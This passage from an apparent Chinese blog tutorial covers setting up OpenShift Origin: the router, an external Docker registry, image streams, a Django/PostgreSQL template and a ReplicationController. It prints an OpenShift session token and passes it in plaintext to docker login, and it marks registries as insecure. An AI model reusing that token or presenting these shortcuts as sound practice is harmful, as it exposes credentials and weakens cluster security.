<p>通过浏览器访问控制台时，也会出现无法访问监控信息的情况，需要确认</p>
<p>（1） 浏览器能够解析hawkular-metrics.devops.inspur地址</p>
<p>（2） 使用浏览器访问改地址<a href="https://hawkular-metrics.devops.inspur/hawkular/metrics%EF%BC%8C%E5%8A%A0%E8%BD%BDhttps%E8%AF%81%E4%B9%A6" target="_blank" rel="noopener">https://hawkular-metrics.devops.inspur/hawkular/metrics，加载https证书</a></p>
<h3 id="部署Route"><a href="#部署Route" class="headerlink" title="部署Route"></a>部署Route</h3><p>在master节点操作</p>
<p>oadm router haproxy-router –replicas=1 –credentials=/etc/origin/master/openshift-router.kubeconfig –service-account=router</p>
<p>增加用户：htpasswd /etc/origin/htpasswd admin</p>
<p>普通用户登录;oc login</p>
<p>系统管理员登录：</p>
<p>export KUBECONFIG=/etc/origin/master/admin.kubeconfig</p>
<p>oc login -u system:admin -n default</p>
<p>此时，整个环境搭建完成，</p>
<h2 id="外部docker-Registry搭建"><a href="#外部docker-Registry搭建" class="headerlink" title="外部docker-Registry搭建"></a>外部docker-Registry搭建</h2><p>搭建一个V2版本的docker-registry</p>
<p>使用一台新的虚拟机，部署docker,部署docker registry</p>
<p>docker run -d -p 5000:5000 –name registry registry:2</p>
<p>注意：在该registry上传镜像时，需要制定子目录：例如例如10.110.17.138:5000/library/postgresql</p>
<h2 id="管理OpenShift"><a href="#管理OpenShift" class="headerlink" title="管理OpenShift"></a>管理OpenShift</h2><h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><p>导入的镜像都存放到了 openshift的内部镜像</p>
<h4 id="1、从第三方仓库导入镜像"><a href="#1、从第三方仓库导入镜像" class="headerlink" title="1、从第三方仓库导入镜像"></a>1、从第三方仓库导入镜像</h4><p>从第三方仓库导入的镜像，只是在OpenShift的内部镜像仓库中，保存了索引信息，真正使用的时候，还是要去第三方仓库下载，将外部镜像导入到OpenShift，可以指定命名空间进行导入</p>
<p>进行导入：oc create <strong>-**f image-streams-centos7-python-postgresql</strong>.**json **-**n demo</p>
<p>导入镜像使用的文件参考参考image-streams-centos7-python-postgresql.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;ImageStreamList&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;items&quot;: \[</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;ImageStream&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;python&quot;,</span><br><span class="line">          &quot;annotations&quot;: &#123;</span><br><span class="line">               &quot;openshift.io&#x2F;image.insecureRepository&quot;: &quot;true&quot;</span><br><span class="line">             &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">         &quot;dockerImageRepository&quot;: &quot;10.110.17.138:5000&#x2F;library&#x2F;python&quot;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;ImageStream&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">       &quot;metadata&quot;: &#123;</span><br><span class="line">           &quot;name&quot;: &quot;postgresql&quot;,</span><br><span class="line">           &quot;annotations&quot;: &#123;</span><br><span class="line">               &quot;openshift.io&#x2F;image.insecureRepository&quot;: &quot;true&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">       &quot;spec&quot;: &#123;</span><br><span class="line">          &quot;dockerImageRepository&quot;: &quot;10.110.17.138:5000&#x2F;library&#x2F;postgresql&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;\]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注意：外部的私有docker-registry 的镜像存储目录必须有子目录：例如10.110.17.138:5000/library/postgresql</p>
<h4 id="2、登录OpenShift-内部docker-registry，导入镜像"><a href="#2、登录OpenShift-内部docker-registry，导入镜像" class="headerlink" title="2、登录OpenShift 内部docker-registry，导入镜像"></a>2、登录OpenShift 内部docker-registry，导入镜像</h4><p>  1、在master节点获取，docker-registry服务的service ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> \[root@origin-master image-streams\]# oc get svc</span><br><span class="line">NAME              CLUSTER\_IP      EXTERNAL\_IP   PORT(S)                 SELECTOR                  AGE</span><br><span class="line">docker-registry   172.30.90.102   &lt;none&gt;        5000&#x2F;TCP                docker-registry&#x3D;default   20h</span><br><span class="line">haproxy-router    172.30.95.6     &lt;none&gt;        80&#x2F;TCP                  router&#x3D;haproxy-router     20h</span><br><span class="line">kubernetes        172.30.0.1      &lt;none&gt;        443&#x2F;TCP,53&#x2F;UDP,53&#x2F;TCP   &lt;none&gt;                    22h</span><br></pre></td></tr></table></figure>



<p>2、查看OpenShift内部docker-registry所在的节点，并登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  root@origin-slave3 ~\]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE                                                                                                           COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">40a2a7f9c5f0        openshift&#x2F;origin-docker-registry:v1.1.0.1                                                                       &quot;&#x2F;bin&#x2F;sh -c &#39;REGISTRY&quot;   5 hours ago         Up 5 hours                              k8s\_registry.afeb0b36\_docker-registry-1-2wsvm\_default\_fa5e59e4-af5a-11e5-8632-fa163efe8294\_4fbf4ffa</span><br><span class="line">b29287d1a00c        10.110.17.138:5000&#x2F;library&#x2F;postgresql@sha256:11dbc16d7d84da0dfb42782ff1f64b0e263d9f8686fe4347f2d02a665582e945   &quot;container-entrypoint&quot;   5 hours ago         Up 5 hours                              k8s\_postgresql.5134f420\_postgresql-1-eun94\_demo\_7e990eb5-af62-11e5-8632-fa163efe8294\_155dadb8</span><br><span class="line">c217ccc5c319        openshift&#x2F;origin-pod:v1.1.0.1                                                                                   &quot;&#x2F;pod&quot;                   5 hours ago         Up 5 hours                              k8s\_POD.18d9fe1e\_postgresql-1-eun94\_demo\_7e990eb5-af62-11e5-8632-fa163efe8294\_257ba619</span><br><span class="line">bbc34e05ca92        openshift&#x2F;origin-pod:v1.1.0.1                                                                                   &quot;&#x2F;pod&quot;                   5 hours ago         Up 5 hours                              k8s\_POD.7c1fe15\_docker-registry-1-2wsvm\_default\_fa5e59e4-af5a-11e5-8632-fa163efe8294\_7a1bd148</span><br></pre></td></tr></table></figure>



<p>3、 以普通用户登录openshift，获取tocker</p>
<p><strong>[**root@origin</strong>-<strong>slave</strong>3** ~**]**# oc whoami **-**t</p>
<p>YAiqVCwCIhMT6FoVXfhpnga4UBiud0Mwzz84-sW3Om8</p>
<p>4、</p>
<p><strong>[**root@origin</strong>-<strong>slave</strong>3** ~<strong>]**# docker login **-**u admin **-**e admin@inspur</strong>.<strong>com **-**p YAiqVCwCIhMT6FoVXfhpnga4UBiud0Mwzz84-sW3Om8 **172.30.90.102:5000</strong></p>
<p>WARNING**:** login credentials saved in <strong>/**root</strong>/.<strong>docker</strong>/config.**json</p>
<p>Login Succeeded</p>
<p>5、 上传镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\[root@origin-slave3 ~\]# docker tag 10.110.17.138:5000&#x2F;library&#x2F;hello-openshift 172.30.90.102:5000&#x2F;demo&#x2F;hello-openshift</span><br><span class="line">\[root@origin-slave3 ~\]# docker push 172.30.90.102:5000&#x2F;demo&#x2F;hello-openshift</span><br><span class="line">The push refers to a repository \[172.30.90.102:5000&#x2F;demo&#x2F;hello-openshift\] (len: 1)</span><br><span class="line">bcfa6006862b: Pushed</span><br><span class="line">bbc202431232: Pushed</span><br><span class="line">eb19dbec24c6: Pushed</span><br><span class="line">0055f04883dd: Pushed</span><br><span class="line">latest: digest: sha256:724411548d3c1ea88402288b2045275cd3fd0488f6d6500f4f6974b278f27f39 size: 6982</span><br></pre></td></tr></table></figure>

<h3 id="部署Template"><a href="#部署Template" class="headerlink" title="部署Template"></a>部署Template</h3><p>Template定义了一套部署应用的完成流程，包含打包、发布等，供开发者使用</p>
<p>部署template</p>
<p>oc create-f django-postgres.json -n openshif</p>
<p>Template 参考文件django-postgres.json，特别注意镜像的使用方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;Template&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">    &quot;annotations&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;An example Django application with a PostgreSQL database&quot;,</span><br><span class="line">      &quot;tags&quot;: &quot;instant-app,python,django,postgresql&quot;,</span><br><span class="line">      &quot;iconClass&quot;: &quot;icon-python&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;labels&quot;: &#123;</span><br><span class="line">    &quot;template&quot;: &quot;django-psql-example&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;objects&quot;: \[</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;Service&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Exposes and load balances the application pods&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;ports&quot;: \[</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;name&quot;: &quot;web&quot;,</span><br><span class="line">            &quot;port&quot;: 8080,</span><br><span class="line">            &quot;targetPort&quot;: 8080</span><br><span class="line">          &#125;</span><br><span class="line">        \],</span><br><span class="line">        &quot;selector&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;django-psql-example&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;Route&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;django-psql-example&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;host&quot;: &quot;$&#123;APPLICATION\_DOMAIN&#125;&quot;,</span><br><span class="line">        &quot;to&quot;: &#123;</span><br><span class="line">          &quot;kind&quot;: &quot;Service&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;django-psql-example&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;ImageStream&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Keeps track of changes in the application image&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;BuildConfig&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Defines how to build the application&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;source&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;Git&quot;,</span><br><span class="line">          &quot;git&quot;: &#123;</span><br><span class="line">            &quot;uri&quot;: &quot;$&#123;SOURCE\_REPOSITORY\_URL&#125;&quot;,</span><br><span class="line">            &quot;ref&quot;: &quot;$&#123;SOURCE\_REPOSITORY\_REF&#125;&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;contextDir&quot;: &quot;$&#123;CONTEXT\_DIR&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;strategy&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;Source&quot;,</span><br><span class="line">          &quot;sourceStrategy&quot;: &#123;</span><br><span class="line">            &quot;from&quot;: &#123;</span><br><span class="line">              &quot;kind&quot;: &quot;ImageStreamTag&quot;,</span><br><span class="line">              &quot;namespace&quot;: &quot;openshift&quot;,</span><br><span class="line">              &quot;name&quot;: &quot;python&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;output&quot;: &#123;</span><br><span class="line">          &quot;to&quot;: &#123;</span><br><span class="line">            &quot;kind&quot;: &quot;ImageStreamTag&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;django-psql-example:latest&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;triggers&quot;: \[</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ImageChange&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ConfigChange&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;GitHub&quot;,</span><br><span class="line">            &quot;github&quot;: &#123;</span><br><span class="line">              &quot;secret&quot;: &quot;$&#123;GITHUB\_WEBHOOK\_SECRET&#125;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        \]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;DeploymentConfig&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Defines how to deploy the application server&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;strategy&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;Rolling&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;triggers&quot;: \[</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ImageChange&quot;,</span><br><span class="line">            &quot;imageChangeParams&quot;: &#123;</span><br><span class="line">              &quot;automatic&quot;: true,</span><br><span class="line">              &quot;containerNames&quot;: \[</span><br><span class="line">                &quot;django-psql-example&quot;</span><br><span class="line">              \],</span><br><span class="line">              &quot;from&quot;: &#123;</span><br><span class="line">                &quot;kind&quot;: &quot;ImageStreamTag&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;django-psql-example:latest&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ConfigChange&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        \],</span><br><span class="line">        &quot;replicas&quot;: 1,</span><br><span class="line">        &quot;selector&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;django-psql-example&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;template&quot;: &#123;</span><br><span class="line">          &quot;metadata&quot;: &#123;</span><br><span class="line">            &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">            &quot;labels&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;django-psql-example&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;spec&quot;: &#123;</span><br><span class="line">            &quot;containers&quot;: \[</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;name&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">                &quot;image&quot;: &quot;django-psql-example&quot;,</span><br><span class="line">                &quot;ports&quot;: \[</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;containerPort&quot;: 8080</span><br><span class="line">                  &#125;</span><br><span class="line">                \],</span><br><span class="line">                &quot;env&quot;: \[</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DATABASE\_SERVICE\_NAME&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DATABASE\_ENGINE&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_ENGINE&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DATABASE\_NAME&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_NAME&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DATABASE\_USER&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_USER&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DATABASE\_PASSWORD&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_PASSWORD&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;APP\_CONFIG&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;APP\_CONFIG&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;DJANGO\_SECRET\_KEY&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DJANGO\_SECRET\_KEY&#125;&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">                \]</span><br><span class="line">              &#125;</span><br><span class="line">            \]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;Service&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Exposes the database server&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;ports&quot;: \[</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;name&quot;: &quot;postgresql&quot;,</span><br><span class="line">            &quot;port&quot;: 5432,</span><br><span class="line">            &quot;targetPort&quot;: 5432</span><br><span class="line">          &#125;</span><br><span class="line">        \],</span><br><span class="line">        &quot;selector&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;kind&quot;: &quot;DeploymentConfig&quot;,</span><br><span class="line">      &quot;apiVersion&quot;: &quot;v1&quot;,</span><br><span class="line">      &quot;metadata&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;,</span><br><span class="line">        &quot;annotations&quot;: &#123;</span><br><span class="line">          &quot;description&quot;: &quot;Defines how to deploy the database&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;spec&quot;: &#123;</span><br><span class="line">        &quot;strategy&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;Recreate&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;triggers&quot;: \[</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ImageChange&quot;,</span><br><span class="line">            &quot;imageChangeParams&quot;: &#123;</span><br><span class="line">              &quot;automatic&quot;: false,</span><br><span class="line">              &quot;containerNames&quot;: \[</span><br><span class="line">                &quot;postgresql&quot;</span><br><span class="line">              \],</span><br><span class="line">              &quot;from&quot;: &#123;</span><br><span class="line">                &quot;kind&quot;: &quot;ImageStreamTag&quot;,</span><br><span class="line">                &quot;namespace&quot;: &quot;openshift&quot;,</span><br><span class="line">                &quot;name&quot;: &quot;postgresql&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;ConfigChange&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        \],</span><br><span class="line">        &quot;replicas&quot;: 1,</span><br><span class="line">        &quot;selector&quot;: &#123;</span><br><span class="line">          &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;template&quot;: &#123;</span><br><span class="line">          &quot;metadata&quot;: &#123;</span><br><span class="line">            &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;,</span><br><span class="line">            &quot;labels&quot;: &#123;</span><br><span class="line">              &quot;name&quot;: &quot;$&#123;DATABASE\_SERVICE\_NAME&#125;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;spec&quot;: &#123;</span><br><span class="line">            &quot;containers&quot;: \[</span><br><span class="line">              &#123;</span><br><span class="line">                &quot;name&quot;: &quot;postgresql&quot;,</span><br><span class="line">                &quot;image&quot;: &quot;postgresql&quot;,</span><br><span class="line">                &quot;ports&quot;: \[</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;containerPort&quot;: 5432</span><br><span class="line">                  &#125;</span><br><span class="line">                \],</span><br><span class="line">                &quot;env&quot;: \[</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;POSTGRESQL\_USER&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_USER&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;POSTGRESQL\_PASSWORD&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_PASSWORD&#125;&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#123;</span><br><span class="line">                    &quot;name&quot;: &quot;POSTGRESQL\_DATABASE&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$&#123;DATABASE\_NAME&#125;&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">                \]</span><br><span class="line">              &#125;</span><br><span class="line">            \]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  \],</span><br><span class="line">  &quot;parameters&quot;: \[</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;SOURCE\_REPOSITORY\_URL&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;The URL of the repository with your application source code&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;https:&#x2F;&#x2F;github.com&#x2F;openshift&#x2F;django-ex.git&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;SOURCE\_REPOSITORY\_REF&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Set this to a branch name, tag or other ref of your repository if you are not using the default branch&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;CONTEXT\_DIR&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Set this to the relative path to your project if it is not in the root of your repository&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;APPLICATION\_DOMAIN&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;The exposed hostname that will route to the Django service, if left blank a value will be defaulted.&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;GITHUB\_WEBHOOK\_SECRET&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;A secret string used to configure the GitHub webhook&quot;,</span><br><span class="line">      &quot;generate&quot;: &quot;expression&quot;,</span><br><span class="line">      &quot;from&quot;: &quot;\[a-zA-Z0-9\]&#123;40&#125;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DATABASE\_SERVICE\_NAME&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Database service name&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;postgresql&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DATABASE\_ENGINE&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Database engine: postgresql, mysql or sqlite (default)&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;postgresql&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DATABASE\_NAME&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Database name&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;default&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DATABASE\_USER&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Database user name&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;django&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DATABASE\_PASSWORD&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Database user password&quot;,</span><br><span class="line">      &quot;generate&quot;: &quot;expression&quot;,</span><br><span class="line">      &quot;from&quot;: &quot;\[a-zA-Z0-9\]&#123;16&#125;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;APP\_CONFIG&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Relative path to Gunicorn configuration file (optional)&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;DJANGO\_SECRET\_KEY&quot;,</span><br><span class="line">      &quot;description&quot;: &quot;Set this to a long random string&quot;,</span><br><span class="line">      &quot;generate&quot;: &quot;expression&quot;,</span><br><span class="line">      &quot;from&quot;: &quot;\[\\\\w\]&#123;50&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  \]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应用管理：</p>
<p>创建应用：基于源码（首先将源码build成镜像），基于镜像，基于模板</p>
<p>基于源码创建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oc new-app myproject&#x2F;my-ruby~https:&#x2F;&#x2F;github.com&#x2F;openshift&#x2F;ruby-hello-world.git （failed）</span><br><span class="line"> oc new-app &#x2F;home&#x2F;user&#x2F;code&#x2F;myapp --strategy&#x3D;docker</span><br></pre></td></tr></table></figure>
<p>基于镜像创建：</p>
<p>使用本地镜像创建：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oc new-app 10.110.17.138:5000&#x2F;centos  --insecure-registry&#x3D;true</span><br></pre></td></tr></table></figure>
<p>ImageStreamTag</p>
<h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><p>文件定义一个部署，例如，可以使用内部的镜像，也可以使用外部的镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ReplicationController</span><br><span class="line">metadata:</span><br><span class="line">  name: frontend-1</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    name: frontend</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        name: frontend</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - image: 172.30.90.102:5000&#x2F;demo&#x2F;hello-openshift</span><br><span class="line">        name: helloworld</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br><span class="line">          protocol: TCP</span><br><span class="line">      restartPolicy: Always</span><br></pre></td></tr></table></figure>

<h3 id="持久化存储-PersistentVolume"><a href="#持久化存储-PersistentVolume" class="headerlink" title="持久化存储 PersistentVolume "></a>持久化存储 PersistentVolume </h3><p>搭建NFS服务器，只支持NFSV4</p>
